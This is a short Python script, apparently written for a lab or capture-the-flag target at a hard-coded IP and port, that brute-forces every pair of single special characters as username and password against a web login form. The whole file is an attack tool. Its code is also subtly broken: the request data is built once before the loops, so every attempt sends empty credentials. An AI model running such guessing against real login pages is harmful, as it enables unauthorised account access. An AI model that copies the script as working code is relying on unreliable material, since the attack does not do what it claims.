# tool for brute forcing special characters onto web logon

import requests

url = "http://157.245.46.136:31430/login" # change url here

username = ""
password = ""
char = ''

# ASCII value of special characters: 32-47, 58-64, 91-96, 123-126
spec_chars = {32:47, 58:64, 91:96, 123:126}

# create dictionary from info on webpage
data = {"username":username, "password":password}

# convert ASCII values to special chars and store them in char
for i in spec_chars.keys():
    for j in range(i, spec_chars[i]+1):
        char += chr(j)

for h in char:
    username = h
    for g in char:
        password = g
        req = requests.post(url, data=data) # make request to webpage

        if (req.status_code == 200) and ("Please login" not in req.text):
            print(f"STATUS_CODE = {req.status_code} || USERNAME = {username} | PASSWORD = {password}")
